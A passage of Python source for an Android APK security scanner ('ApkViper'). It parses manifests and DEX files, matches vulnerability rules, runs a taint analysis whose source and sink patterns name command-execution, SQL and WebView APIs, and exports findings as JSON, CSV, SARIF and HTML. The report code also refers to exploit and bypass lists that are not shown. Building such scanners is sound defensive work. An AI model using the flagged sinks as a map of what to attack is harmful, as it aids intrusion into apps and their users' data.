                            if prefix: aname = prefix + ":" + aname
                        # resolve value
                        if a_val_str >= 0 and a_val_str < len(strings):
                            aval = strings[a_val_str]
                        elif a_type == 0x10:  # int
                            aval = str(a_val)
                        elif a_type == 0x12:  # boolean
                            aval = "true" if a_val != 0 else "false"
                        elif a_type == 0x01:  # reference
                            aval = "@0x{:08x}".format(a_val)
                        else:
                            aval = "0x{:x}".format(a_val)
                        attrs.append('{}="{}"'.format(aname, aval))
                        apos += 20
                    attr_str = " " + " ".join(attrs) if attrs else ""
                    result.append("  " * indent + "<{}{}>".format(tag, attr_str))
                    indent += 1
            elif chunk_type == 0x0103:  # END_TAG
                indent = max(0, indent - 1)
                if pos + 20 <= len(data):
                    name_idx = struct.unpack_from("<I", data, pos + 20)[0]
                    tag = strings[name_idx] if name_idx < len(strings) else "?"
                    result.append("  " * indent + "</{}>".format(tag))
            pos += chunk_size
        return "\n".join(result)
    except Exception:
        return _bin_xml_fallback(data)

def _bin_xml_fallback(data):
    """Fallback: extract ASCII strings from binary data."""
    strings = []; i = 0
    while i < len(data) - 1:
        if 32 <= data[i] < 127:
            start = i
            while i < len(data) and 32 <= data[i] < 127: i += 1
            s = data[start:i].decode("ascii", errors="ignore")
            if len(s) >= 3: strings.append(s)
        else: i += 1
    return "\n".join(strings)

# ============================================================
#  ENHANCED DEX PARSER  (strings + class defs + type descriptors)
# ============================================================
def _parse_dex(data):
    """Parse DEX file: extract strings, class names, and type descriptors."""
    lines = []
    try:
        if len(data) < 112 or data[:4] != b"dex\n":
            return "// Invalid DEX\n"
        # Header fields
        str_ids_sz  = struct.unpack_from("<I", data, 56)[0]
        str_ids_off = struct.unpack_from("<I", data, 60)[0]
        type_ids_sz  = struct.unpack_from("<I", data, 64)[0]
        type_ids_off = struct.unpack_from("<I", data, 68)[0]
        class_defs_sz  = struct.unpack_from("<I", data, 96)[0]
        class_defs_off = struct.unpack_from("<I", data, 100)[0]

        # Read all strings
        str_cache = {}
        for i in range(min(str_ids_sz, 30000)):
            s = _dex_read_string(data, str_ids_off, i)
            if s and len(s) > 1:
                str_cache[i] = s

        # Extract type descriptors -> human readable class names
        lines.append("// === DEX Classes ===")
        for i in range(min(type_ids_sz, 10000)):
            off = type_ids_off + i * 4
            if off + 4 > len(data): break
            str_idx = struct.unpack_from("<I", data, off)[0]
            s = str_cache.get(str_idx, "")
            if s.startswith("L") and s.endswith(";"):
                # Convert Lcom/example/Class; -> com.example.Class
                cls = s[1:-1].replace("/", ".")
                lines.append("class " + cls)

        # Extract class_defs for superclass info
        lines.append("\n// === DEX Strings ===")
        for idx, s in sorted(str_cache.items()):
            if len(s) > 3:
                lines.append(s)
    except Exception:
        pass
    return "\n".join(lines)

def _dex_read_string(data, str_ids_off, idx):
    """Read a single string from DEX string table."""
    off_ptr = str_ids_off + idx * 4
    if off_ptr + 4 > len(data): return ""
    str_data_off = struct.unpack_from("<I", data, off_ptr)[0]
    if str_data_off >= len(data): return ""
    pos = str_data_off
    # ULEB128 length
    size = 0; shift = 0
    while pos < len(data):
        b = data[pos]; pos += 1
        size |= (b & 0x7F) << shift
        if (b & 0x80) == 0: break
        shift += 7
    end = min(pos + size, len(data))
    try:
        return data[pos:end].decode("utf-8", errors="replace").strip()
    except: return ""

# ============================================================
#  APK EXTRACTOR  (uses proper AXML + enhanced DEX)
# ============================================================
def extract_apk(apk_path, progress_cb=None):
    """Extract APK contents with proper binary XML and DEX parsing."""
    files = OrderedDict()
    if not zipfile.is_zipfile(apk_path):
        raise ValueError("Not a valid APK/ZIP")
    with zipfile.ZipFile(apk_path, "r") as zf:
        entries = zf.namelist()
        total = len(entries)
        for i, name in enumerate(entries):
            if progress_cb and i % 50 == 0:
                progress_cb(int(i * 100 / max(total, 1)), name)
            try:
                info = zf.getinfo(name)
                if info.file_size > 10 * 1024 * 1024 or info.file_size == 0:
                    continue
                data = zf.read(name)
                if name.endswith(".dex"):
                    files[name] = _parse_dex(data)
                elif name == "AndroidManifest.xml":
                    files[name] = _parse_axml(data)
                elif name.endswith((".xml", ".java", ".kt", ".smali", ".properties",
                                    ".json", ".txt", ".cfg", ".yaml", ".yml")):
                    files[name] = data.decode("utf-8", errors="replace")
                elif any(name.endswith(e) for e in (".so", ".p12", ".pem", ".key", ".bks", ".db")):
                    files[name] = "// Binary: " + name
            except Exception:
                pass
    if progress_cb:
        progress_cb(100, "Done")
    return files, total

# ============================================================
#  TAINT ANALYSIS ENGINE  (lightweight inter-procedural)
# ============================================================
TAINT_SOURCES = [
    (r'getIntent\(\)', "Intent data"),
    (r'getExtras\(\)', "Intent extras"),
    (r'getStringExtra\s*\(', "Intent string extra"),
    (r'getParameter\s*\(', "HTTP parameter"),
    (r'getText\(\)', "User input (EditText)"),
    (r'getQueryParameter\s*\(', "URI query parameter"),
    (r'readLine\(\)', "Stream input"),
    (r'getSharedPreferences', "SharedPreferences read"),
]
TAINT_SINKS = [
    (r'execSQL\s*\(', "SQL execution", "SQL Injection", "CWE-89", "CRITICAL"),
    (r'rawQuery\s*\(', "Raw SQL query", "SQL Injection", "CWE-89", "CRITICAL"),
    (r'Runtime\.getRuntime\(\)\.exec', "Command execution", "Command Injection", "CWE-78", "CRITICAL"),
    (r'ProcessBuilder', "Process creation", "Command Injection", "CWE-78", "HIGH"),
    (r'startActivity\s*\(', "Activity launch", "Intent Redirect", "CWE-940", "HIGH"),
    (r'sendBroadcast\s*\(', "Broadcast send", "Broadcast Injection", "CWE-927", "MEDIUM"),
    (r'loadUrl\s*\(', "WebView URL load", "WebView Injection", "CWE-79", "HIGH"),
    (r'evaluateJavascript\s*\(', "JS evaluation", "XSS", "CWE-79", "HIGH"),
    (r'openConnection\s*\(', "URL connection", "SSRF", "CWE-918", "HIGH"),
    (r'Log\.(d|v|i|w|e)\s*\(', "Logging", "Data Leak via Logs", "CWE-532", "MEDIUM"),
]

def run_taint_analysis(files):
    """Lightweight taint analysis: find source->sink flows within files."""
    taint_findings = []
    for path, content in files.items():
        if _ftype(path) != "SOURCE":
            continue
        lines = content.split("\n")
        # Track which lines have taint sources
        source_lines = {}
        for i, line in enumerate(lines):
            for pattern, label in TAINT_SOURCES:
                if re.search(pattern, line):
                    source_lines[i] = label
                    break
        if not source_lines:
            continue
        # Check if any sink is reachable within 30 lines of a source
        for src_line, src_label in source_lines.items():
            for j in range(src_line, min(src_line + 30, len(lines))):
                line = lines[j]
                for sink_pat, sink_label, vuln_name, cwe, sev in TAINT_SINKS:
                    if re.search(sink_pat, line):
                        taint_findings.append(Finding(
                            id="DA-TAINT-{:03d}".format(len(taint_findings) + 1),
                            title="Taint Flow: {} -> {}".format(src_label, sink_label),
                            severity=sev, cwe=cwe, owasp="M7",
                            file=path, line=j + 1,
                            evidence=lines[j].strip()[:200],
                            desc="Data flows from {} (line {}) to {} (line {}). Potential {}.".format(
                                src_label, src_line + 1, sink_label, j + 1, vuln_name),
                            fix="Validate/sanitize data between source and sink.",
                            cvss={"CRITICAL": 9.8, "HIGH": 7.5, "MEDIUM": 5.3}.get(sev, 5.0)))
    return taint_findings

# ============================================================
#  SCAN ENGINE  (rules + taint analysis)
# ============================================================
def scan_files(files, progress_cb=None):
    """Scan with regex rules AND taint analysis."""
    findings = []
    fl = list(files.items())
    total = len(fl)
    for idx, (path, content) in enumerate(fl):
        if progress_cb and idx % 20 == 0:
            progress_cb(int(idx * 80 / max(total, 1)), path)
        ftype = _ftype(path)
        lines = content.split("\n")
        for rule in RULES:
            if ftype not in rule["types"]:
                continue
            try:
                pat = re.compile(rule["regex"])
            except re.error:
                continue
            found = False
            for i, line in enumerate(lines):
                s = line.strip()
                if not s or s.startswith("//") or s.startswith("*"):
                    continue
                if s.startswith("import ") or s.startswith("package "):
                    continue
                if pat.search(line):
                    if found: continue
                    found = True
                    findings.append(Finding(
                        id=rule["id"], title=rule["name"], severity=rule["sev"],
                        cwe=rule["cwe"], owasp=rule.get("owasp", ""),
                        file=path, line=i + 1, evidence=s[:200],
                        desc=rule["desc"], fix=rule["fix"],
                        cvss=rule.get("cvss", 0.0)))
    # Run taint analysis
    if progress_cb:
        progress_cb(85, "Taint analysis...")
    taint_results = run_taint_analysis(files)
    findings.extend(taint_results)
    if progress_cb:
        progress_cb(100, "Done")
    findings.sort(key=lambda f: SEV_ORDER.get(f.severity, 5))
    return findings

def _ftype(p):
    pl = p.lower()
    if "androidmanifest" in pl: return "MANIFEST"
    if pl.endswith((".xml", ".yaml", ".yml", ".json", ".properties", ".cfg")): return "RESOURCE"
    return "SOURCE"

def _sev_counts(findings):
    c = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in findings:
        c[f.severity] = c.get(f.severity, 0) + 1
    return c

# ============================================================
#  SESSION MANAGEMENT
# ============================================================
def save_session(apk_name, files, findings):
    """Save scan session to disk."""
    os.makedirs(SESSION_DIR, exist_ok=True)
    safe = re.sub(r'[^\w\-.]', '_', apk_name)
    path = os.path.join(SESSION_DIR, safe + ".session.json")
    data = {
        "apk": apk_name,
        "timestamp": datetime.now().isoformat(),
        "file_count": len(files),
        "findings": [f.to_dict() for f in findings],
        "file_paths": list(files.keys()),
    }
    Path(path).write_text(json.dumps(data, indent=2), encoding="utf-8")
    return path

def load_session(path):
    """Load session from disk. Returns (apk_name, findings)."""
    data = json.loads(Path(path).read_text(encoding="utf-8"))
    findings = [Finding(**f) for f in data.get("findings", [])]
    return data.get("apk", ""), findings

def list_sessions():
    """List all saved sessions."""
    if not os.path.isdir(SESSION_DIR):
        return []
    return [f for f in os.listdir(SESSION_DIR) if f.endswith(".session.json")]

# ============================================================
#  ANDROID COMPONENT EXTRACTION
# ============================================================
def _extract_android_components(files):
    c = {"activities":[],"services":[],"receivers":[],"providers":[],"permissions":[],"package":"","min_sdk":"","target_sdk":""}
    manifest = ""
    for p,ct in files.items():
        if "androidmanifest" in p.lower(): manifest = ct; break
    if not manifest: return c
    m = re.search(r'package\s*=\s*"([^"]*)"', manifest)
    if m: c["package"] = m.group(1)
    m = re.search(r'minSdkVersion\s*=\s*"?(\d+)', manifest)
    if m: c["min_sdk"] = m.group(1)
    m = re.search(r'targetSdkVersion\s*=\s*"?(\d+)', manifest)
    if m: c["target_sdk"] = m.group(1)
    for tag,key in [("activity","activities"),("service","services"),("receiver","receivers"),("provider","providers")]:
        for m in re.finditer(r'<'+tag+r'[^>]*?android:name\s*=\s*"([^"]*)"', manifest, re.S):
            c[key].append(m.group(1))
    for m in re.finditer(r'<uses-permission[^>]*?android:name\s*=\s*"([^"]*)"', manifest, re.S):
        c["permissions"].append(m.group(1))
    return c

def _svg_pie(sc):
    total = sum(sc.values())
    if total == 0: return "<p style='color:#aaa'>No data</p>"
    colors = {"CRITICAL":"#e74c3c","HIGH":"#e67e22","MEDIUM":"#f1c40f","LOW":"#3498db","INFO":"#95a5a6"}
    svg = '<svg width="220" height="220" viewBox="-1.1 -1.1 2.2 2.2">'
    start = 0
    for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
        cnt = sc.get(sev,0)
        if cnt == 0: continue
        pct = cnt/total; end_a = start + pct*2*math.pi
        lg = 1 if pct > 0.5 else 0
        x1,y1 = math.cos(start),math.sin(start)
        x2,y2 = math.cos(end_a),math.sin(end_a)
        svg += '<path d="M0,0 L{:.4f},{:.4f} A1,1 0 {},1 {:.4f},{:.4f} Z" fill="{}"/>'.format(x1,y1,lg,x2,y2,colors.get(sev,"#ccc"))
        start = end_a
    svg += '</svg><div style="margin-top:8px">'
    for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
        cnt = sc.get(sev,0)
        if cnt == 0: continue
        svg += '<span style="display:inline-block;width:10px;height:10px;background:{};margin-right:3px;border-radius:2px"></span><span style="margin-right:10px;font-size:11px">{}: {}</span>'.format(colors[sev],sev,cnt)
    svg += '</div>'
    return svg

def _svg_bar(cats):
    if not cats: return ""
    cn = {"MAN":"Manifest","CRY":"Crypto","SEC":"Secrets","NET":"Network","PLT":"Platform","INJ":"Injection","RES":"Resilience","PRV":"Privacy","CLD":"Cloud","AUT":"Auth","WEB":"Web","OTH":"Other","TAINT":"Taint"}
    cc = {"MAN":"#e67e22","CRY":"#e74c3c","SEC":"#c0392b","NET":"#e67e22","PLT":"#f39c12","INJ":"#e74c3c","RES":"#3498db","PRV":"#9b59b6","CLD":"#e67e22","AUT":"#d35400","WEB":"#e74c3c","OTH":"#95a5a6","TAINT":"#c0392b"}
    mx = max(cats.values())
    svg = ''
    for cat,cnt in sorted(cats.items(), key=lambda x:-x[1]):
        pct = cnt/mx*100
        svg += '<div style="display:flex;align-items:center;margin:3px 0"><span style="width:90px;font-size:11px;color:#666">{}</span><div style="background:{};height:16px;width:{}%;border-radius:3px;min-width:3px"></div><span style="margin-left:6px;font-size:11px;font-weight:700">{}</span></div>'.format(cn.get(cat,cat),cc.get(cat,"#3498db"),pct,cnt)
    return svg

# ============================================================
#  EXPORTERS  (HTML, PDF, Word, Excel, JSON, CSV, SARIF)
# ============================================================
def export_json(findings, apk, out, files=None):
    comps = _extract_android_components(files or {})
    d = {"tool": APP_NAME, "version": VERSION, "target": apk,
         "generated": datetime.now().isoformat(), "total": len(findings),
         "summary": _sev_counts(findings), "components": comps,
         "findings": [f.to_dict() for f in findings]}
    Path(out).write_text(json.dumps(d, indent=2), encoding="utf-8")

def export_csv_report(findings, apk, out, files=None):
    with open(out, "w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh)
        w.writerow(["ID", "Title", "Severity", "CWE", "OWASP", "CVSS", "File", "Line", "Description", "Evidence", "Fix"])
        for f in findings:
            w.writerow([f.id, f.title, f.severity, f.cwe, f.owasp, f.cvss, f.file, f.line, f.desc, f.evidence, f.fix])

def export_sarif(findings, apk, out, files=None):
    rules_s, seen = [], set()
    for f in findings:
        if f.id not in seen:
            seen.add(f.id)
            rules_s.append({"id": f.id, "name": f.title,
                            "shortDescription": {"text": f.title},
                            "properties": {"security-severity": str(f.cvss)}})
    results = [{"ruleId": f.id,
                "level": {"CRITICAL": "error", "HIGH": "error", "MEDIUM": "warning",
                          "LOW": "note", "INFO": "note"}.get(f.severity, "note"),
                "message": {"text": f.desc},
                "locations": [{"physicalLocation": {
                    "artifactLocation": {"uri": f.file.replace("\\", "/")},
                    "region": {"startLine": f.line}}}]} for f in findings]
    sarif = {"$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
             "version": "2.1.0",
             "runs": [{"tool": {"driver": {"name": APP_NAME, "version": VERSION, "rules": rules_s}},
                        "results": results}]}
    Path(out).write_text(json.dumps(sarif, indent=2), encoding="utf-8")

def _build_html_report(findings, apk, files):
    sc = _sev_counts(findings)
    comps = _extract_android_components(files or {})
    tc = sum(f.cvss for f in findings if isinstance(f.cvss,(int,float)))
    avg = tc/max(len(findings),1)
    rl = "CRITICAL" if avg>=9 else "HIGH" if avg>=7 else "MEDIUM" if avg>=4 else "LOW"
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    rid = "DA-{:06d}".format(abs(hash(apk)) % 999999)
    pkg = comps.get("package","N/A")
    ncomp = len(comps["activities"])+len(comps["services"])+len(comps["receivers"])+len(comps["providers"])
    rcol = {"CRITICAL":"#f85149","HIGH":"#f0883e","MEDIUM":"#e3b341","LOW":"#3fb950"}.get(rl,"#388bfd")
    scol = {"CRITICAL":"#f85149","HIGH":"#f0883e","MEDIUM":"#e3b341","LOW":"#3fb950","INFO":"#388bfd"}
    def esc(s): return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;") if s else ""
    cats = {}
    for f in findings:
        c = f.id.split("-")[1] if "-" in f.id else "OTH"
        cats[c] = cats.get(c,0)+1
    owasp_hit = set()
    for f in findings:
        ow = f.owasp if hasattr(f,'owasp') else ""
        if ow:
            for i in range(1,11):
                if "M{}".format(i) in str(ow): owasp_hit.add("M{}".format(i))
    # Impact text per severity
    impacts = {"CRITICAL":"Complete compromise of application data and user accounts. An attacker can exploit this remotely without authentication. Full data exfiltration, account takeover, and persistent backdoor installation are possible.",
               "HIGH":"Significant data exposure or unauthorized access to sensitive functionality. Exploitation requires minimal user interaction and can lead to credential theft, session hijacking, or privilege escalation.",
               "MEDIUM":"Partial information disclosure or limited unauthorized actions. Requires specific conditions or moderate attacker capability to exploit. May enable further attacks when chained.",
               "LOW":"Minor information leak with limited direct security impact. Exploitation difficulty is high and requires physical access or significant prerequisites.",
               "INFO":"Informational finding for security hardening. No direct exploit path but represents defense-in-depth improvement opportunity."}
    # Match exploits to findings
    def _find_exploit(f):
        for ex in EXPLOITS:
            if any(kw.lower() in f.title.lower() for kw in ex["vuln"].split()):
                return ex
        return None
    def _find_bypass(f):
        for bp in BYPASS_TECHNIQUES:
            if any(kw.lower() in f.title.lower() for kw in bp["name"].split()):
                return bp
        return None
    # SVG pie chart
    def _pie_svg():
        total = sum(sc.values())
        if total == 0: return ""
        cols = [("CRITICAL","#f85149"),("HIGH","#f0883e"),("MEDIUM","#e3b341"),("LOW","#3fb950"),("INFO","#388bfd")]
        svg = '<svg viewBox="0 0 200 200" width="160" height="160">'
        start = 0
        for sn,cl in cols:
            cnt = sc.get(sn,0)
            if cnt == 0: continue
            angle = 360.0*cnt/total
            end = start + angle
            x1 = 100 + 80*math.cos(math.radians(start-90))
            y1 = 100 + 80*math.sin(math.radians(start-90))
            x2 = 100 + 80*math.cos(math.radians(end-90))
            y2 = 100 + 80*math.sin(math.radians(end-90))
            lg = 1 if angle > 180 else 0
            svg += '<path d="M100,100 L{:.1f},{:.1f} A80,80 0 {},1 {:.1f},{:.1f} Z" fill="{}"/>'.format(x1,y1,lg,x2,y2,cl)
            start = end
        svg += '<circle cx="100" cy="100" r="45" fill="#0d1117"/>'
        svg += '<text x="100" y="105" text-anchor="middle" fill="#c9d1d9" font-size="20" font-weight="bold">{}</text></svg>'.format(total)
        return svg
    # Risk gauge SVG
    dash = 188.5 * (avg / 10.0)
    gauge = '<svg viewBox="0 0 140 80" width="180" height="100">'
    gauge += '<path d="M 10 70 A 60 60 0 0 1 130 70" fill="none" stroke="#30363d" stroke-width="12" stroke-linecap="round"/>'
    gauge += '<path d="M 10 70 A 60 60 0 0 1 130 70" fill="none" stroke="{}" stroke-width="12" stroke-linecap="round" stroke-dasharray="{:.1f} 188.5"/>'.format(rcol, dash)
    gauge += '<text x="70" y="58" text-anchor="middle" fill="{}" font-size="22" font-weight="bold">{:.1f}</text>'.format(rcol, avg)
    gauge += '<text x="70" y="74" text-anchor="middle" fill="#8b949e" font-size="10">/ 10.0</text></svg>'

    h = []
    # === CSS (dark theme matching Java report) ===
    h.append("<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>")
    h.append("<title>{} Security Assessment - {}</title>".format(APP_NAME, esc(apk)))
    h.append("<style>")
    h.append("*{margin:0;padding:0;box-sizing:border-box}::selection{background:#388bfd40;color:#fff}")
    h.append("body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#0d1117;color:#c9d1d9;line-height:1.6;-webkit-font-smoothing:antialiased}")
    h.append(".hdr{text-align:center;padding:50px 30px 30px;background:linear-gradient(135deg,#161b22,#0d1117);border-bottom:1px solid #30363d}")
    h.append(".logo{font-size:36px;font-weight:800;color:#58a6ff} .logo span{color:#f0883e}")
    h.append("h1{font-size:22px;color:#c9d1d9;font-weight:400} .sub{color:#8b949e;font-size:13px;margin-top:5px}")
    h.append(".clf{color:#f85149;font-size:10px;font-weight:700;letter-spacing:2px;margin-top:10px;padding:4px 12px;border:1px solid #f8514950;border-radius:4px;display:inline-block}")
    h.append(".mr{display:flex;justify-content:center;gap:24px;margin-top:25px;flex-wrap:wrap}")
    h.append(".mi{background:#161b22;padding:12px 20px;border-radius:8px;border:1px solid #30363d}")
    h.append(".ml{color:#8b949e;font-size:10px;text-transform:uppercase;letter-spacing:1px} .mv{color:#c9d1d9;font-size:14px;font-weight:600;margin-top:3px}")
    h.append("section{padding:30px;border-bottom:1px solid #21262d} h2{color:#58a6ff;font-size:18px;margin-bottom:20px;padding-bottom:8px;border-bottom:1px solid #30363d}")
    h.append(".sg{display:grid;grid-template-columns:240px 1fr 180px;gap:20px;align-items:start}")
    h.append(".rg{text-align:center;background:#161b22;padding:20px;border-radius:10px;border:1px solid #30363d}")
    h.append(".gl{color:#8b949e;font-size:11px;text-transform:uppercase;margin-bottom:10px}")
    h.append(".rlv{font-weight:700;font-size:12px;margin-top:8px}")
    h.append(".scs{display:flex;flex-direction:column;gap:8px}")
    h.append(".sc{padding:12px 16px;border-radius:8px;border-left:4px solid;display:flex;align-items:center;gap:12px}")
    h.append(".sc .cn{font-size:24px;font-weight:700;min-width:40px} .sc .sl{color:#8b949e;font-size:12px;text-transform:uppercase}")
    h.append(".ca{background:#161b22;padding:20px;border-radius:10px;border:1px solid #30363d;display:flex;align-items:center;justify-content:center}")
    h.append(".mg{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}")
    h.append(".mc{background:#161b22;padding:16px;border-radius:8px;border:1px solid #30363d} .mc h4{color:#58a6ff;font-size:13px;margin-bottom:8px} .mc ul{padding-left:16px;color:#8b949e;font-size:12px} .mc li{margin:4px 0}")
    h.append(".ct{width:100%;border-collapse:collapse;font-size:13px} .ct th{background:#161b22;color:#8b949e;padding:10px 14px;text-align:left;border-bottom:2px solid #30363d;font-size:11px;text-transform:uppercase} .ct td{padding:10px 14px;border-bottom:1px solid #21262d}")
    h.append(".sf{color:#f85149;font-weight:700} .sp{color:#3fb950;font-weight:700}")
    h.append(".og{display:grid;grid-template-columns:repeat(5,1fr);gap:10px}")
    h.append(".oi{background:#161b22;padding:14px;border-radius:8px;border:1px solid #30363d;text-align:center}")
    h.append(".oi.cv{border-color:#f85149;background:#1a1a2e} .oid{font-weight:700;color:#58a6ff;font-size:14px} .on{color:#8b949e;font-size:10px;margin:4px 0} .os{font-size:11px;font-weight:600}")
    h.append(".oi.cv .os{color:#f85149} .oi:not(.cv) .os{color:#3fb950}")
    # Finding cards
    h.append(".fc{background:#161b22;border-radius:12px;border:1px solid #30363d;margin-bottom:20px;overflow:hidden}")
    h.append(".fc:hover{border-color:#30363d80;box-shadow:0 4px 24px rgba(0,0,0,.4)}")
    h.append(".fs{height:3px;width:100%}")
    h.append(".fh{display:flex;align-items:flex-start;justify-content:space-between;padding:18px 22px 14px;gap:16px}")
    h.append(".fhl{display:flex;align-items:flex-start;gap:14px;flex:1}")
    h.append(".fi{width:42px;height:42px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}")
    h.append(".fid{color:#8b949e;font-size:11px;margin-bottom:3px} .ft2{font-size:16px;font-weight:700;color:#e6edf3}")
    h.append(".fsp{font-size:11px;font-weight:700;padding:4px 14px;border-radius:20px;letter-spacing:.5px;text-transform:uppercase}")
    h.append(".fcv{text-align:center;min-width:60px} .fcvv{font-size:22px;font-weight:800;line-height:1}")
    h.append(".fcvb{width:60px;height:4px;background:#21262d;border-radius:2px;margin:5px auto 3px;overflow:hidden} .fcvf{height:100%;border-radius:2px}")
    h.append(".fcvl{font-size:9px;color:#8b949e;text-transform:uppercase;letter-spacing:1px}")
    h.append(".fmr{display:flex;flex-wrap:wrap;gap:8px;padding:0 22px 14px;border-bottom:1px solid #21262d}")
    h.append(".fmc{display:inline-flex;align-items:center;background:#0d1117;border:1px solid #21262d;border-radius:6px;overflow:hidden;font-size:11px}")
    h.append(".fmcl{background:#21262d;color:#8b949e;padding:3px 8px;font-weight:600;text-transform:uppercase;font-size:9px;letter-spacing:.5px}")
    h.append(".fmcv{padding:3px 10px;color:#c9d1d9;font-weight:500} .fmcm{font-family:Consolas,monospace;color:#79c0ff;font-size:10px}")
    h.append(".fp{padding:18px 22px}")
    h.append(".fpi{display:flex;align-items:center;gap:10px;margin-bottom:12px} .fpin{font-size:13px;font-weight:700;color:#e6edf3;text-transform:uppercase;letter-spacing:.5px}")
    h.append(".fpc{font-size:13px;line-height:1.8;color:#b1bac4;padding:14px 18px;border-radius:8px}")
    h.append(".fpi2{background:linear-gradient(135deg,#1a0a0a,#161b22);border:1px solid #f8514920}")
    h.append(".fpf{background:linear-gradient(135deg,#0a1a0a,#161b22);border:1px solid #3fb95020;white-space:pre-wrap}")
    h.append("pre.fpcd{background:#0d1117;border:1px solid #30363d;padding:14px 18px;border-radius:8px;font-family:'JetBrains Mono',Consolas,monospace;font-size:12px;line-height:1.7;white-space:pre-wrap;word-break:break-word;color:#c9d1d9;overflow-x:auto}")
    h.append("pre.fpe{border-color:#f0883e25;background:linear-gradient(135deg,#1a1408,#0d1117)}")
    h.append("pre.fps{border-color:#58a6ff25;background:linear-gradient(135deg,#0a1020,#0d1117)}")
    h.append(".disc{background:#161b22;padding:20px;border-radius:8px;border:1px solid #30363d;color:#8b949e;font-size:12px;line-height:1.8}")
    h.append("footer{text-align:center;padding:30px;color:#484f58;font-size:11px;border-top:1px solid #21262d}")
    h.append("@media print{body{background:#fff;color:#1a1a2e} .fc{break-inside:avoid;border:1px solid #ddd}}")
    h.append("@media(max-width:900px){.sg{grid-template-columns:1fr} .og{grid-template-columns:repeat(2,1fr)} .mg{grid-template-columns:1fr} .fh{flex-direction:column}}")
    h.append("</style></head><body>")

    # === HEADER ===
    h.append("<div class='hdr'>")
    h.append("<div class='logo'>Apk<span>Viper</span></div>")
    h.append("<h1>Enterprise Security Assessment Report</h1>")
    h.append("<p class='sub'>Automated Static Application Security Testing (SAST) &bull; OWASP MASVS &bull; CVSS 3.1</p>")
    h.append("<div class='clf'>CONFIDENTIAL &mdash; AUTHORIZED PERSONNEL ONLY</div>")
    h.append("<div class='mr'>")
    h.append("<div class='mi'><div class='ml'>Target Application</div><div class='mv'>{}</div></div>".format(esc(apk)))
    h.append("<div class='mi'><div class='ml'>Package Name</div><div class='mv'>{}</div></div>".format(esc(pkg)))
    h.append("<div class='mi'><div class='ml'>Assessment Date</div><div class='mv'>{}</div></div>".format(now))
    h.append("<div class='mi'><div class='ml'>Engine Version</div><div class='mv'>{} v{}</div></div>".format(APP_NAME,VERSION))
    h.append("<div class='mi'><div class='ml'>Report ID</div><div class='mv'>{}</div></div>".format(rid))
    h.append("</div></div>")

    # === TABLE OF CONTENTS ===
    h.append("<nav style='padding:20px 30px;border-bottom:1px solid #21262d'><h3 style='color:#58a6ff;font-size:14px;margin-bottom:8px'>Table of Contents</h3><ol style='padding-left:20px'>")
    for i,t in enumerate(["Executive Summary","Methodology &amp; Scope","OWASP Mobile Top 10 Coverage","Compliance Mapping","Android Components &amp; Permissions","Detailed Findings ({})".format(len(findings)),"Disclaimer &amp; Limitations"],1):
        h.append("<li style='margin:4px 0'><a href='#s{}' style='color:#79c0ff;text-decoration:none;font-size:13px'>{}</a></li>".format(i,t))
    h.append("</ol></nav>")

    # === 1. EXECUTIVE SUMMARY ===
    h.append("<section id='s1'><h2>1. Executive Summary</h2>")
    h.append("<p style='color:#8b949e;font-size:13px;margin-bottom:20px;line-height:1.8'>This report presents the findings from an automated security assessment of <strong>{}</strong> ({}). The analysis identified <strong>{}</strong> security findings. The overall risk score is <strong style='color:{}'>{:.1f}/10</strong>.</p>".format(esc(apk),esc(pkg),len(findings),rcol,avg))
    h.append("<div class='sg'>")
    # Risk Gauge
    h.append("<div class='rg'><div class='gl'>RISK SCORE</div>{}<div class='rlv' style='color:{}'>{}</div><div style='color:#8b949e;font-size:10px;margin-top:4px'>Based on CVSS 3.1</div></div>".format(gauge,rcol,rl+" RISK"))
    # Severity cards
    h.append("<div class='scs'>")
    for sn,cl,bg in [("CRITICAL","#f85149","#7d1a1a"),("HIGH","#f0883e","#5a3000"),("MEDIUM","#e3b341","#4a3800"),("LOW","#3fb950","#1a3a1a"),("INFO","#388bfd","#1a2a3a")]:
        h.append("<div class='sc' style='border-color:{};background:{}'><div class='cn' style='color:{}'>{}</div><div class='sl'>{}</div></div>".format(cl,bg,cl,sc[sn],sn))
    h.append("</div>")
    # Pie chart
    h.append("<div class='ca'>{}</div>".format(_pie_svg()))
    h.append("</div></section>")

    # === 2. METHODOLOGY ===
    h.append("<section id='s2'><h2>2. Methodology &amp; Scope</h2><div class='mg'>")
    for title,items in [("Analysis Approach",["Automated SAST of decompiled APK","Binary manifest/resource parsing","Pattern-based detection with context filtering","Inter-procedural taint flow analysis","CVSS 3.1 scoring with OWASP MASVS mapping"]),
                        ("Standards &amp; Frameworks",["OWASP MASVS v2","OWASP MASTG","MITRE CWE","CVSS v3.1","NIST 800-53 r5"]),
                        ("Scan Coverage",["AndroidManifest.xml configuration","DEX bytecode class/string extraction","Java/Kotlin source patterns","Resource &amp; network security config","Taint source-to-sink flow tracking"])]:
        h.append("<div class='mc'><h4>{}</h4><ul>{}</ul></div>".format(title,"".join("<li>{}</li>".format(i) for i in items)))
    h.append("</div></section>")

    # === 3. OWASP TOP 10 ===
    h.append("<section id='s3'><h2>3. OWASP Mobile Top 10 Coverage</h2><div class='og'>")
    onames = ["Platform Usage","Data Storage","Communication","Authentication","Cryptography","Authorization","Code Quality","Code Tampering","Reverse Engineering","Extra Functionality"]
    for i in range(10):
        mid = "M{}".format(i+1)
        hit = mid in owasp_hit
        h.append("<div class='oi{}'><div class='oid'>{}</div><div class='on'>{}</div><div class='os'>{}</div></div>".format(" cv" if hit else "",mid,onames[i],"\u26a0 FINDINGS" if hit else "\u2713 CLEAR"))
    h.append("</div></section>")

    # === 4. COMPLIANCE ===
    h.append("<section id='s4'><h2>4. Compliance Mapping</h2><table class='ct'><thead><tr><th>Framework</th><th>Controls</th><th>Status</th><th>Findings</th></tr></thead><tbody>")
